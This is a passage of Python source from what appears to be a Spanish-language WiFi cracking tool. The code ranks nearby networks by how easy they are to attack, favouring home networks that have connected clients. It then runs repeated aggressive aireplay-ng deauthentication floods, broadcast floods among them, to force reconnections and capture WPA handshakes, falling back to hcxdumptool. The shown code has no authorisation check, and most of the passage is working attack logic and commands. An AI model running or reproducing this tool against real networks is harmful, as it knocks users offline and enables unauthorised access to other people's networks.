            status = "SELECCIONADO" if score >= min_score and len(selected) < max_targets else "DESCARTADO"
            color = Colors.GREEN if status == "SELECCIONADO" else Colors.RED
            
            self.log(f"{color}{target['essid']:20} | Score: {score:3d} | {reasons} | {status}{Colors.END}", "INFO")
            
            if score >= min_score and len(selected) < max_targets:
                selected.append(target)
        
        # Si no hay objetivos con buena puntuación, tomar los mejores disponibles
        if not selected and scored_targets:
            self.log("No hay objetivos ideales, seleccionando los mejores disponibles...", "WARNING")
            selected = [scored['target'] for scored in scored_targets[:3]]
        
        if selected:
            self.log(f"\n=== OBJETIVOS SELECCIONADOS AUTOMÁTICAMENTE: {len(selected)} ===\n", "SUCCESS")
            for i, target in enumerate(selected, 1):
                self.log(f"{i}. {target['essid']} ({target['clients']} clientes, {target['power']}dBm)", "SUCCESS")
        else:
            self.log("No se pudieron seleccionar objetivos automáticamente", "ERROR")
        
        return selected
    
    def manual_target_selection_with_intelligence(self):
        """Selección manual con información visual inteligente"""
        self.display_targets_with_difficulty_info()
        
        print(f"\n{Colors.BOLD}Código de colores:{Colors.END}")
        print(f"{Colors.GREEN}● FÁCIL{Colors.END}    - Redes con clientes conectados (alta probabilidad de éxito)")
        print(f"{Colors.YELLOW}● MEDIO{Colors.END}   - Buena señal pero sin clientes (probabilidad media)")
        print(f"{Colors.RED}● DIFÍCIL{Colors.END}  - Señal débil y sin clientes (baja probabilidad)")
        print(f"{Colors.PURPLE}● WPS{Colors.END}     - WPS habilitado (muy fácil si funciona)")
        
        # Continuar con la selección manual
        return self.get_manual_selection()
    
    def display_targets_with_difficulty_info(self):
        """Mostrar objetivos con información de dificultad y probabilidad"""
        if not self.targets:
            self.log("No hay objetivos disponibles", "WARNING")
            return
        
        # Calcular scores para cada objetivo (mismo algoritmo que el modo auto)
        scored_targets = []
        for i, target in enumerate(self.targets, 1):
            score = self.calculate_target_score(target)
            difficulty = self.get_difficulty_level(target, score)
            scored_targets.append({
                'index': i,
                'target': target,
                'score': score,
                'difficulty': difficulty
            })
        
        print(f"\n{Colors.BOLD}{Colors.UNDERLINE}Redes WiFi encontradas (ordenadas por dificultad):{Colors.END}")
        print(f"{'#':<3} {'ESSID':<25} {'BSSID':<18} {'CH':<3} {'PWR':<4} {'CLI':<4} {'ENC':<10} {'DIFICULTAD':<15} {'PROBABILIDAD'}")
        print("-" * 100)
        
        # Ordenar por dificultad (fáciles primero)
        scored_targets.sort(key=lambda x: (-x['score'], x['target']['essid']))
        
        for item in scored_targets:
            target = item['target']
            difficulty = item['difficulty']
            index = item['index']
            
            # Color según dificultad
            if difficulty['level'] == 'FACIL':
                color = Colors.GREEN
                probability = "🔥 ALTA (80-95%)"
            elif difficulty['level'] == 'WPS':
                color = Colors.PURPLE  
                probability = "⚡ MUY ALTA (90%+)"
            elif difficulty['level'] == 'MEDIO':
                color = Colors.YELLOW
                probability = "🟡 MEDIA (40-60%)"
            else:  # DIFICIL
                color = Colors.RED
                probability = "🔴 BAJA (10-30%)"
            
            print(f"{color}{index:<3} {target['essid']:<25} {target['bssid']:<18} "
                  f"{target['channel']:<3} {target['power']:<4} {target['clients']:<4} {target['encryption']:<10} "
                  f"{difficulty['level']:<15} {probability}{Colors.END}")
            
            # Mostrar razones de la dificultad
            if difficulty['reasons']:
                reasons_text = ' | '.join(difficulty['reasons'])
                print(f"    → {Colors.CYAN}{reasons_text}{Colors.END}")
    
    def calculate_target_score(self, target):
        """Calcular score de un objetivo (reutiliza lógica del modo auto)"""
        score = 0
        
        # Factor 1: Clientes conectados (MUY IMPORTANTE)
        if target['clients'] > 0:
            score += target['clients'] * 50
        
        # Factor 2: Fuerza de señal
        signal_score = max(0, target['power'] + 100)
        score += signal_score
        
        # Factor 3: Tipo de encriptación
        if 'WPS' in target['encryption']:
            score += 100
        elif 'WPA2' in target['encryption']:
            score += 30
        elif 'WPA' in target['encryption']:
            score += 20
        
        # Factor 4: Nombre del ESSID
        essid_lower = target['essid'].lower()
        if any(pattern in essid_lower for pattern in ['familia', 'casa', 'home', 'wifi']):
            score += 25
        
        # Factor 5: Penalizar redes corporativas
        if any(corp in essid_lower for corp in ['guest', 'public', 'free', 'hotspot']):
            score -= 50
        
        return max(0, score)
    
    def get_difficulty_level(self, target, score):
        """Determinar nivel de dificultad y razones"""
        reasons = []
        
        # Determinar nivel basado en score y características
        if 'WPS' in target['encryption'] and score > 100:
            level = 'WPS'
            reasons.append('WPS habilitado')
        elif target['clients'] > 0 and score >= 100:
            level = 'FACIL'
            reasons.append(f"{target['clients']} clientes conectados")
            if target['power'] > -60:
                reasons.append('excelente señal')
        elif target['power'] > -60 and score >= 60:
            level = 'MEDIO'
            reasons.append('buena señal')
            if target['clients'] == 0:
                reasons.append('sin clientes activos')
        else:
            level = 'DIFICIL'
            if target['power'] <= -70:
                reasons.append('señal débil')
            if target['clients'] == 0:
                reasons.append('sin clientes')
        
        # Añadir información sobre ESSID
        essid_lower = target['essid'].lower()
        if any(pattern in essid_lower for pattern in ['familia', 'casa', 'home']):
            reasons.append('nombre común (+ fácil)')
        
        return {
            'level': level,
            'reasons': reasons
        }
    
    def manual_target_selection(self):
        """Selección manual simple (modo legacy)"""
        self.display_targets()
        
        print(f"\n{Colors.BOLD}Opciones de selección:{Colors.END}")
        print(f"1. {Colors.BOLD}Números específicos{Colors.END} (ej: 1,3,5) - Elige manualmente")
        print(f"2. {Colors.GREEN}Solo redes FÁCILES{Colors.END} (con clientes) - {Colors.BOLD}RECOMENDADO{Colors.END}")
        print(f"3. {Colors.PURPLE}Solo redes WPS{Colors.END} (si las hay) - Más fácil")
        print(f"4. {Colors.YELLOW}Todas las redes{Colors.END} (all) - Para expertos")
        print(f"5. {Colors.CYAN}Top 5 por señal{Colors.END} (top5) - Mejores señales")
        print(f"6. {Colors.RED}Modo automático{Colors.END} (auto) - Deja que el sistema elija")
        
        print(f"\n{Colors.BOLD}Consejo:{Colors.END} Para máximo éxito, elige redes {Colors.GREEN}VERDES{Colors.END} (fáciles) primero")
        
        try:
            choice = self.safe_input(
                f"\n{Colors.BOLD}Tu selección:{Colors.END} ",
                default="clients",  # Opción más segura por defecto
                allow_empty=False
            ).lower()
            if not choice:
                self.log("Selección vacía - usando 'clients' por defecto", "WARNING")
                choice = "clients"
            selected = []
            
            if choice == 'auto':
                return self.intelligent_target_selection()
            elif choice == 'all':
                selected = self.targets.copy()
                self.log(f"Seleccionadas TODAS las {len(selected)} redes", "WARNING")
            elif choice == 'top5':
                selected = sorted(self.targets, key=lambda x: x['power'], reverse=True)[:5]
                self.log(f"Seleccionadas top 5 redes por señal", "INFO")
            elif choice == 'wps' or choice == '3':
                selected = [t for t in self.targets if 'WPS' in t['encryption']]
                if selected:
                    self.log(f"Encontradas {len(selected)} redes con WPS habilitado", "SUCCESS")
                else:
                    self.log("No se encontraron redes con WPS", "WARNING")
            elif choice in ['clients', '2', 'facil', 'fácil']:
                # Solo redes fáciles (con clientes conectados)
                selected = [t for t in self.targets if t['clients'] > 0]
                selected = sorted(selected, key=lambda x: x['clients'], reverse=True)
                if selected:
                    self.log(f"\u2728 Encontradas {len(selected)} redes FÁCILES con clientes activos", "SUCCESS")
                    for i, target in enumerate(selected[:3], 1):
                        self.log(f"  {i}. {target['essid']} ({target['clients']} clientes, {target['power']}dBm)", "SUCCESS")
                else:
                    self.log("No se encontraron redes con clientes conectados - Modo difícil activado", "WARNING")
                    return self.select_backup_targets()
            elif choice in ['1'] or any(c.isdigit() or c == ',' for c in choice):
                # Números específicos
                indices = []
                for x in choice.replace(' ', '').split(','):
                    if x.strip().isdigit():
                        indices.append(int(x.strip()) - 1)
                
                selected = [self.targets[i] for i in indices if 0 <= i < len(self.targets)]
                if selected:
                    self.log(f"Seleccionadas {len(selected)} redes manualmente:", "INFO")
                    for target in selected:
                        difficulty = self.get_difficulty_level(target, self.calculate_target_score(target))
                        color = Colors.GREEN if difficulty['level'] == 'FACIL' else Colors.YELLOW if difficulty['level'] == 'MEDIO' else Colors.RED
                        self.log(f"  → {color}{target['essid']} ({difficulty['level']}){Colors.END}", "INFO")
                else:
                    self.log("Selección inválida, intentando otra vez...", "ERROR")
                    return self.manual_target_selection_with_intelligence()
            else:
                self.log("Opción no reconocida, mostrando ayuda...", "WARNING")
                return self.manual_target_selection_with_intelligence()
            
            if not selected:
                self.log("Ninguna red seleccionada", "WARNING")
                return []
            
            return selected
        
        except Exception as e:
            self.log(f"Error en selección: {e}", "ERROR")
            return self.manual_target_selection_with_intelligence()
    
    def select_backup_targets(self):
        """Seleccionar objetivos cuando no hay redes fáciles"""
        self.log("\n=== MODO DIFÍCIL ACTIVADO ===", "WARNING")
        self.log("No hay redes con clientes conectados. Seleccionando mejores alternativas...", "INFO")
        
        # Buscar redes con WPS primero
        wps_targets = [t for t in self.targets if 'WPS' in t['encryption']]
        if wps_targets:
            self.log(f"\u2728 Encontradas {len(wps_targets)} redes con WPS - Intentando estas primero", "SUCCESS")
            return sorted(wps_targets, key=lambda x: x['power'], reverse=True)[:3]
        
        # Si no hay WPS, tomar las de mejor señal
        best_signal = sorted(self.targets, key=lambda x: x['power'], reverse=True)[:5]
        self.log(f"Seleccionando {len(best_signal)} redes con mejor señal (modo experto)", "INFO")
        
        return best_signal
    
    def get_manual_selection(self):
        """Obtener selección manual del usuario estilo Wifite"""
        print(f"\n{Colors.BOLD}Selecciona los objetivos a atacar:{Colors.END}")
        print(f"Ejemplo: {Colors.CYAN}1{Colors.END} (una red) o {Colors.CYAN}1,2,14{Colors.END} (múltiples redes)")
        print(f"Opciones especiales: {Colors.GREEN}facil{Colors.END} | {Colors.PURPLE}wps{Colors.END} | {Colors.YELLOW}all{Colors.END}")
        
        try:
            while True:
                choice = self.safe_input(
                    f"\n{Colors.BOLD}[+] Selección:{Colors.END} ",
                    default="facil",  # Opción más segura por defecto
                    allow_empty=False
                ).lower()
                if not choice:
                    self.log("Selección vacía - usando 'facil' por defecto", "WARNING")
                    choice = "facil"
                
                if not choice:
                    print(f"{Colors.RED}[!] Por favor ingresa una selección{Colors.END}")
                    continue
                
                # Procesar selección
                selected = self.process_user_selection(choice)
                if selected:
                    return selected
                else:
                    print(f"{Colors.RED}[!] Selección inválida, inténtalo de nuevo{Colors.END}")
                    continue
                    
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Operación cancelada por el usuario{Colors.END}")
            return []
    
    def process_user_selection(self, choice):
        """Procesar la selección del usuario"""
        selected = []
        
        # Opciones especiales
        if choice in ['facil', 'fácil', 'easy']:
            selected = [t for t in self.targets if t['clients'] > 0]
            if selected:
                self.log(f"[+] Seleccionadas {len(selected)} redes FÁCILES (con clientes)", "SUCCESS")
            else:
                print(f"{Colors.RED}[!] No hay redes fáciles disponibles{Colors.END}")
                return None
        
        elif choice in ['wps']:
            selected = [t for t in self.targets if 'WPS' in t['encryption']]
            if selected:
                self.log(f"[+] Seleccionadas {len(selected)} redes con WPS", "SUCCESS")
            else:
                print(f"{Colors.RED}[!] No hay redes con WPS disponibles{Colors.END}")
                return None
        
        elif choice in ['all', 'todas']:
            selected = self.targets.copy()
            self.log(f"[+] Seleccionadas TODAS las {len(selected)} redes", "WARNING")
        
        else:
            # Números específicos (estilo Wifite)
            try:
                # Limpiar y dividir la entrada
                numbers = []
                for num_str in choice.replace(' ', '').split(','):
                    if num_str.isdigit():
                        numbers.append(int(num_str))
                
                if not numbers:
                    return None
                
                # Validar y obtener redes
                for num in numbers:
                    if 1 <= num <= len(self.targets):
                        target = self.targets[num - 1]  # -1 porque mostramos desde 1
                        selected.append(target)
                    else:
                        print(f"{Colors.RED}[!] Número {num} fuera de rango (1-{len(self.targets)}){Colors.END}")
                        return None
                
                if selected:
                    self.log(f"[+] Seleccionadas {len(selected)} redes manualmente:", "SUCCESS")
                    for i, target in enumerate(selected, 1):
                        difficulty = self.get_difficulty_level(target, self.calculate_target_score(target))
                        color = self.get_difficulty_color(difficulty['level'])
                        print(f"    {i}. {color}{target['essid']}{Colors.END} ({difficulty['level']})")
                        
            except ValueError:
                return None
        
        return selected if selected else None
    
    def get_difficulty_color(self, level):
        """Obtener color según nivel de dificultad"""
        if level == 'FACIL':
            return Colors.GREEN
        elif level == 'WPS':
            return Colors.PURPLE
        elif level == 'MEDIO':
            return Colors.YELLOW
        else:
            return Colors.RED
    
    def simple_target_selection(self):
        """Selección mejorada de objetivos con vista previa"""
        if not self.targets:
            self.log("⚠️ No hay objetivos disponibles para selección", "WARNING")
            return []
        
        self.log(f"📊 Mostrando {len(self.targets)} objetivos disponibles...", "INFO")
        self.display_targets()
        
        print(f"\n{Colors.BOLD}Opciones de selección:{Colors.END}")
        print(f"1-{len(self.targets)}. Seleccionar por números (ej: 1,3,5)")
        print("all. Todos los objetivos")
        print("top5. Top 5 por señal")
        print("wps. Solo redes con WPS")
        print(f"{Colors.GREEN}clients. Solo redes con clientes (RECOMENDADO){Colors.END}")
        print("q. Salir")
        
        while True:
            try:
                # PASO 1: Obtener selección
                try:
                    # Intentar con método robusto primero
                    self.log("Esperando selección del usuario...", "INFO")
                    choice = self.robust_input(f"\n{Colors.CYAN}Tu selección: {Colors.END}")
                except EOFError:
                    self.log("No se pudo obtener entrada del usuario - cancelando selección", "ERROR")
                    print(f"\n{Colors.RED}⚠️ No se pudo leer entrada. Posibles soluciones:{Colors.END}")
                    print(f"  1. Ejecutar en terminal interactivo")
                    print(f"  2. Verificar que no está redirigido stdin")
                    print(f"  3. Usar: python3 wifi_auditor_pro.py directamente")
                    
                    # Ofrecer modo automático como fallback
                    print(f"\n{Colors.YELLOW}Intentando selección automática...{Colors.END}")
                    return self.automatic_fallback_selection()
                except KeyboardInterrupt:
                    self.log("Operación cancelada por el usuario (Ctrl+C)", "WARNING")
                    return []
                
                # Validar que no esté vacío
                if not choice:
                    print(f"{Colors.YELLOW}Por favor ingresa una opción válida.{Colors.END}")
                    continue
                    
                if choice.lower() == 'q':
                    self.log("Operación cancelada por el usuario", "WARNING")
                    return []
                
                # Procesar selección y mostrar vista previa
                self.log(f"🔍 Procesando selección: '{choice}'", "INFO")
                preview_selected = self.process_selection_preview(choice)
                
                if preview_selected is None:
                    print(f"{Colors.RED}❌ Selección inválida. Inténtalo de nuevo.{Colors.END}")
                    print(f"{Colors.CYAN}Opciones válidas: 1-{len(self.targets)}, 'clients', 'all', 'wps', 'top5', 'q'{Colors.END}")
                    continue
                
                if not preview_selected:
                    print(f"{Colors.YELLOW}⚠️ No hay redes que coincidan con tu selección '{choice}'.{Colors.END}")
                    print(f"{Colors.CYAN}Prueba con otras opciones como 'clients' o 'all'{Colors.END}")
                    continue
                
                # Mostrar vista previa
                self.show_selection_preview(preview_selected)
                
                # PASO 2: Bucle separado para confirmación
                while True:
                    try:
                        confirm = self.safe_input(
                            f"\n{Colors.YELLOW}¿Proceder con estos objetivos? (s/n): {Colors.END}",
                            default="n",  # Valor por defecto en caso de EOF
                            allow_empty=False
                        ).lower()
                        if not confirm:  # EOF manejado por safe_input
                            self.log("Confirmación vacía - usando valor por defecto 'no'", "WARNING")
                            confirm = "n"
                        
                        if confirm in ['s', 'si', 'y', 'yes']:
                            self.log(f"Confirmados {len(preview_selected)} objetivos", "SUCCESS")
                            return preview_selected
                        elif confirm in ['n', 'no']:
                            print(f"{Colors.BLUE}Volviendo a selección...{Colors.END}")
                            break  # Salir del bucle de confirmación, volver al de selección
                        else:
                            print(f"{Colors.RED}Respuesta inválida. Por favor responde 's' o 'n'{Colors.END}")
                            continue
                    except KeyboardInterrupt:
                        print(f"\n{Colors.YELLOW}Operación cancelada{Colors.END}")
                        return []
                
            except EOFError:
                self.log("EOF detectado en bucle principal - saliendo", "WARNING")
                return []
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}Operación cancelada{Colors.END}")
                return []
            except Exception as e:
                self.log(f"Error inesperado en selección: {str(e)}", "ERROR")
                if hasattr(e, '__traceback__'):
                    import traceback
                    self.log(f"Detalles del error: {traceback.format_exc()}", "ERROR")
                
                # Preguntar al usuario si quiere continuar
                try:
                    retry = self.safe_input(
                        f"\n{Colors.YELLOW}¿Intentar de nuevo? (s/n): {Colors.END}",
                        default="n",  # Por defecto no reintentar
                        allow_empty=False
                    ).lower()
                    if not retry or retry not in ['s', 'si', 'y', 'yes']:
                        return []
                except KeyboardInterrupt:
                    return []
                continue
    
    def process_selection_preview(self, choice):
        """Procesar selección y devolver lista para vista previa"""
        # DEBUG: Agregar información de debug
        if self.config.get('verbose', True):
            self.log(f"🔧 DEBUG: Procesando selección '{choice}' con {len(self.targets)} targets", "INFO")
        
        choice = choice.lower().strip()
        selected = []
        
        # Verificación de estado
        if not self.targets:
            self.log("⚠️ No hay targets disponibles para seleccionar", "ERROR")
            return None
        
        try:
            if choice == 'all':
                selected = self.targets.copy()
                self.log(f"✅ Seleccionados TODOS los {len(selected)} targets", "INFO")
                
            elif choice == 'top5':
                selected = sorted(self.targets, key=lambda x: x['power'], reverse=True)[:5]
                self.log(f"✅ Seleccionados top 5 por señal: {len(selected)} targets", "INFO")
                
            elif choice == 'wps':
                selected = [t for t in self.targets if 'WPS' in t['encryption'] or 'WPS' in t.get('extra_info', '')]
                self.log(f"✅ Seleccionados {len(selected)} targets con WPS", "INFO")
                
            elif choice == 'clients':
                # Solo redes con clientes conectados
                selected = [t for t in self.targets if t['clients'] > 0]
                selected = sorted(selected, key=lambda x: x['clients'], reverse=True)
                self.log(f"✅ Seleccionados {len(selected)} targets con clientes", "INFO")
                
            else:
                # Números específicos
                if ',' in choice or choice.isdigit():
                    if self.config.get('verbose', True):
                        self.log(f"🔍 Detectando números en: {choice}", "INFO")
                    
                    indices = []
                    for num_str in choice.replace(' ', '').split(','):
                        if num_str.isdigit():
                            num = int(num_str)
                            if self.config.get('verbose', True):
                                self.log(f"  - Procesando número: {num}", "INFO")
                            
                            if 1 <= num <= len(self.targets):
                                indices.append(num - 1)  # Convertir a índice base 0
                                if self.config.get('verbose', True):
                                    self.log(f"    ✅ Número {num} válido (rango 1-{len(self.targets)})", "INFO")
                            else:
                                self.log(f"❌ Número {num} fuera de rango (1-{len(self.targets)})", "ERROR")
                                return None
                        else:
                            self.log(f"❌ '{num_str}' no es un número válido", "ERROR")
                            return None
                    
                    if indices:
                        selected = [self.targets[i] for i in indices]
                        self.log(f"✅ Seleccionados {len(selected)} targets por números: {[i+1 for i in indices]}", "SUCCESS")
                        
                        # DEBUG: Mostrar targets seleccionados
                        if self.config.get('verbose', True):
                            for i, target in enumerate(selected):
                                self.log(f"  - Target {i+1}: {target['essid']}", "INFO")
                    else:
                        self.log("❌ No se encontraron números válidos", "ERROR")
                        return None
                else:
                    self.log(f"❌ Opción '{choice}' no reconocida", "ERROR")
                    return None  # Selección inválida
            
            return selected
            
        except Exception as e:
            self.log(f"❌ Error procesando selección: {e}", "ERROR")
            import traceback
            self.log(f"Detalles del error: {traceback.format_exc()}", "ERROR")
            return None
    
    def show_selection_preview(self, selected_targets):
        """Mostrar vista previa de los objetivos seleccionados"""
        print(f"\n{Colors.BOLD}🎯 OBJETIVOS SELECCIONADOS:{Colors.END}")
        print("─" * 70)
        
        total_clients = sum(t['clients'] for t in selected_targets)
        avg_power = sum(t['power'] for t in selected_targets) / len(selected_targets)
        
        for i, target in enumerate(selected_targets, 1):
            # Determinar color según dificultad
            if target['clients'] > 0:
                color = Colors.GREEN
                difficulty = "FÁCIL"
            elif target['power'] > -60:
                color = Colors.YELLOW 
                difficulty = "MEDIO"
            else:
                color = Colors.RED
                difficulty = "DIFÍCIL"
            
            client_info = f"{Colors.GREEN}👥{target['clients']}{Colors.END}" if target['clients'] > 0 else f"{Colors.RED}👥{target['clients']}{Colors.END}"
            power_info = f"{target['power']}dBm"
            
            # Limpiar y truncar ESSID de forma segura
            safe_essid = str(target.get('essid', 'Unknown'))[:30].ljust(30)
            
            print(f"{i:2d}. {color}{safe_essid}{Colors.END} | {power_info:8} | {client_info} | {color}{difficulty}{Colors.END}")
        
        print("─" * 70)
        print(f"📊 Estadísticas: {len(selected_targets)} redes | {total_clients} clientes total | {avg_power:.0f}dBm promedio")
        
        # Recomendación
        easy_count = len([t for t in selected_targets if t['clients'] > 0])
        if easy_count > 0:
            print(f"{Colors.GREEN}✅ {easy_count} redes FÁCILES (con clientes) - ¡Excelente elección!{Colors.END}")
        elif len(selected_targets) <= 3:
            print(f"{Colors.YELLOW}⚠️ Redes sin clientes - será más lento, pero factible{Colors.END}")
        else:
            print(f"{Colors.RED}⚠️ Muchas redes difíciles - considera reducir la selección{Colors.END}")

    def capture_handshake(self, target):
        """Capturar handshake WPA/WPA2 - Método simple y eficiente"""
        self.log(f"Capturando handshake para {target['essid']} (Canal {target['channel']})", "INFO")
        
        if target['clients'] == 0:
            self.log(f"Sin clientes detectados - este target puede ser difícil", "WARNING")
        
        # Archivo de captura
        capture_filename = f"{target['essid']}_{target['bssid'].replace(':', '')}"
        capture_file = self.handshake_dir / capture_filename
        
        # Cambiar a canal del objetivo
        self.run_command(f"iwconfig {self.monitor_interface} channel {target['channel']}")
        self.log(f"Canal fijado en: {target['channel']}", "INFO")
        
        # Iniciar airodump-ng para captura
        dump_command = f"airodump-ng {self.monitor_interface} --bssid {target['bssid']} -c {target['channel']} -w {capture_file}"
        dump_process = subprocess.Popen(dump_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Esperar un poco antes de deauth
        time.sleep(3)
        
        # Primero, buscar clientes conectados al AP
        self.log("Escaneando clientes conectados al AP...", "INFO")
        client_scan_command = f"timeout 10 airodump-ng {self.monitor_interface} --bssid {target['bssid']} -c {target['channel']} --write /tmp/client_scan"
        self.run_command(client_scan_command)
        
        # Ataque de deautenticación
        deauth_packets = self.config.get('deauth_packets', 10)
        deauth_command = f"aireplay-ng -0 {deauth_packets} -a {target['bssid']} {self.monitor_interface}"
        self.log("Enviando paquetes de deautenticación para forzar reconexiones...", "INFO")
        
        # Ejecutar deauth de forma más agresiva
        self.log("Ejecutando ataques de deautenticación agresivos hasta capturar handshake...", "INFO")
        
        handshake_captured = False
        max_attempts = 20  # Más intentos
        
        for attempt in range(max_attempts):
            self.log(f"Intento {attempt + 1}/{max_attempts} de deautenticación AGRESIVA", "INFO")
            
            # Estrategias múltiples para capturar EAPOL
            deauth_strategies = [
                f"aireplay-ng -0 5 -a {target['bssid']} {self.monitor_interface}",   # Deauth suave
                f"aireplay-ng -0 10 -a {target['bssid']} {self.monitor_interface}",  # Deauth normal
                f"aireplay-ng -0 20 -a {target['bssid']} {self.monitor_interface}",  # Deauth agresivo
                f"aireplay-ng -0 1 -a {target['bssid']} -c FF:FF:FF:FF:FF:FF {self.monitor_interface}", # Broadcast
            ]
            
            # Ejecutar estrategias con pausas para permitir reconexiones
            for i, strategy in enumerate(deauth_strategies):
                self.log(f"Estrategia de deauth {i+1}/{len(deauth_strategies)}", "INFO")
                subprocess.Popen(strategy, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(2)  # Pausa más larga para permitir reconexiones
            
            # Esperar y verificar si ya tenemos handshake
            time.sleep(10)
            
            # Verificar si ya capturamos handshake con EAPOL data
            cap_file_check = f"{capture_file}-01.cap"
            if os.path.exists(cap_file_check):
                success, output, _ = self.run_command(f"aircrack-ng {cap_file_check}")
                
                # Verificar que hay handshake Y que aircrack puede procesarlo
                if "WPA (1 handshake)" in output or "handshakes" in output.lower():
                    # Verificar que NO hay el error de "no EAPOL data"
                    if "no EAPOL data" not in output and "unable to process" not in output:
                        handshake_captured = True
                        self.log(f"Handshake válido con EAPOL detectado en intento {attempt + 1}", "SUCCESS")
                        break
                    else:
                        self.log(f"Handshake detectado pero SIN paquetes EAPOL útiles (intento {attempt + 1})", "WARNING")
                elif "WPA (0 handshake)" in output:
                    self.log(f"Aún no hay handshake válido (intento {attempt + 1})", "WARNING")
            
            if not handshake_captured:
                self.log(f"Aún sin handshake, continuando ataques...", "INFO")
        
        if not handshake_captured:
            self.log("Esperando tiempo adicional para captura completa...", "INFO")
            time.sleep(30)
        
        # Detener captura
        dump_process.terminate()
        time.sleep(2)
        
        # Verificar si se capturó handshake con múltiples verificaciones
        cap_file = f"{capture_file}-01.cap"
        if os.path.exists(cap_file):
            file_size = os.path.getsize(cap_file)
            self.log(f"Archivo de captura: {file_size} bytes", "INFO")
            
            # Verificar con aircrack-ng
            success, output, _ = self.run_command(f"aircrack-ng {cap_file}")
            
            # Si aircrack-ng no puede procesar por falta de EAPOL, intentar con tshark
            if "no EAPOL data" in output or "unable to process" in output:
                self.log("Aircrack-ng no puede procesar - verificando EAPOL con tshark...", "INFO")
                
                # Verificar paquetes EAPOL con tshark
                tshark_success, tshark_output, _ = self.run_command(
                    f'tshark -r {cap_file} -Y "eapol" -T fields -e frame.number | wc -l'
                )
                
                if tshark_success:
                    eapol_count = int(tshark_output.strip()) if tshark_output.strip().isdigit() else 0
                    self.log(f"Paquetes EAPOL encontrados: {eapol_count}", "INFO")
                    
                    if eapol_count >= 4:  # Necesitamos al menos 4 paquetes EAPOL para un handshake
                        self.log(f"Suficientes paquetes EAPOL detectados", "SUCCESS")
                        return cap_file
                    else:
                        self.log(f"Insuficientes paquetes EAPOL ({eapol_count}/4 mínimos)", "WARNING")
                        return None
            
            # Verificar que realmente hay handshake válido - no solo paquetes WPA
            has_handshake = ("WPA (1 handshake)" in output or 
                           "WPA (2 handshake)" in output or 
                           "WPA (3 handshake)" in output or 
                           "WPA (4 handshake)" in output or
                           "handshakes" in output.lower())
            
            if has_handshake and "no EAPOL data" not in output:
                self.log(f"Handshake válido capturado para {target['essid']}", "SUCCESS")
                return cap_file
            else:
                self.log(f"Archivo de captura existe pero NO contiene handshake útil", "WARNING")
                if "WPA (0 handshake)" in output:
                    self.log(f"El archivo tiene paquetes WPA pero ningún handshake completo", "ERROR")
                elif "no EAPOL data" in output:
                    self.log(f"El archivo no contiene paquetes EAPOL necesarios", "ERROR")
                self.log(f"Es necesario forzar más reconexiones de clientes", "INFO")
                self.log(f"Salida de aircrack-ng: {output[:200]}...", "INFO")
        
        self.log(f"Método tradicional falló - probando captura alternativa con hcxdumptool...", "WARNING")
        
        # Método alternativo con hcxdumptool (más moderno)
        return self.alternative_handshake_capture(target)

    def alternative_handshake_capture(self, target):
        """Método alternativo de captura usando hcxdumptool y técnicas avanzadas"""
        self.log(f"Iniciando captura alternativa para {target['essid']}", "INFO")
        
        # Archivo de captura alternativo
        alt_capture_file = self.handshake_dir / f"{target['essid']}_alt_{target['bssid'].replace(':', '')}.pcapng"
        
        # Verificar si hcxdumptool está disponible
        hcx_available, _, _ = self.run_command("which hcxdumptool")
        
        if hcx_available:
            self.log("Usando hcxdumptool para captura avanzada...", "INFO")
            
            # Comando hcxdumptool con filtro para el target específico
            hcx_command = f"timeout 60 hcxdumptool -i {self.monitor_interface} -o {alt_capture_file} --enable_status=1 --filterlist_ap={target['bssid']} --filtermode=2"
            
            hcx_process = subprocess.Popen(hcx_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Esperar un poco y luego hacer deauth
            time.sleep(5)
            
            # Deauth continuo durante la captura
            for _ in range(10):
                deauth_cmd = f"aireplay-ng -0 3 -a {target['bssid']} {self.monitor_interface}"
                subprocess.Popen(deauth_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(3)
            
            # Esperar que termine
            hcx_process.wait()
            
            if alt_capture_file.exists() and alt_capture_file.stat().st_size > 1000:
                self.log(f"Captura alternativa completada: {alt_capture_file.stat().st_size} bytes", "SUCCESS")
                
                # Convertir a formato cap si es necesario
                cap_output = str(alt_capture_file).replace('.pcapng', '.cap')
                convert_success, _, _ = self.run_command(f"tshark -r {alt_capture_file} -w {cap_output}")
                
                if convert_success and os.path.exists(cap_output):
                    return cap_output
                else:
                    return str(alt_capture_file)
        
        self.log(f"No se pudo capturar handshake con métodos alternativos", "ERROR")
        return None

    def count_eapol_packets(self, file_path):
        """Contar paquetes EAPOL en archivo de captura"""
        try:
            # Método 1: Usar tshark si está disponible
            success, output, _ = self.run_command(
                f'tshark -r "{file_path}" -Y "eapol" -T fields -e frame.number 2>/dev/null | wc -l'
            )
            if success and output.strip().isdigit():
                return int(output.strip())
            
            # Método 2: Usar tcpdump como alternativa
            success, output, _ = self.run_command(
                f'tcpdump -r "{file_path}" -c 1000 2>/dev/null | grep -c "EAPOL"'
            )
            if success and output.strip().isdigit():
                return int(output.strip())
            
            # Método 3: Verificar con aircrack-ng
            success, output, _ = self.run_command(f'aircrack-ng "{file_path}" 2>/dev/null')
            if success and "handshake" in output.lower():
                # Intentar extraer número de handshakes
                import re
                handshake_matches = re.findall(r'WPA \((\d+) handshake', output)
                if handshake_matches:
                    return int(handshake_matches[0]) * 4  # Cada handshake tiene ~4 paquetes EAPOL
            
            return 0
        except Exception as e:
            self.log(f"Error contando paquetes EAPOL: {e}", "ERROR")
            return 0

    def _enable_monitor_alternative(self):
        """Método alternativo para habilitar modo monitor usando iw"""
        self.log("Intentando método alternativo con iw...", "INFO")
        
        try:
            # Método 1: Usar iw directamente
            iw_path = getattr(self, 'tool_paths', {}).get('iw', '/usr/sbin/iw')
            iwconfig_path = getattr(self, 'tool_paths', {}).get('iwconfig', '/usr/sbin/iwconfig')
            
            # Primero bajar la interfaz
            self.run_command(f"ip link set {self.interface} down")
            time.sleep(1)
            
            # Cambiar a modo monitor
            success, output, error = self.run_command(f"{iw_path} dev {self.interface} set type monitor")
            if not success:
                self.log(f"Error cambiando a modo monitor: {error}", "WARNING")
                
                # Método 2: Crear nueva interfaz en modo monitor
                self.log("Intentando crear nueva interfaz en modo monitor...", "INFO")
                monitor_name = f"{self.interface}mon"
                
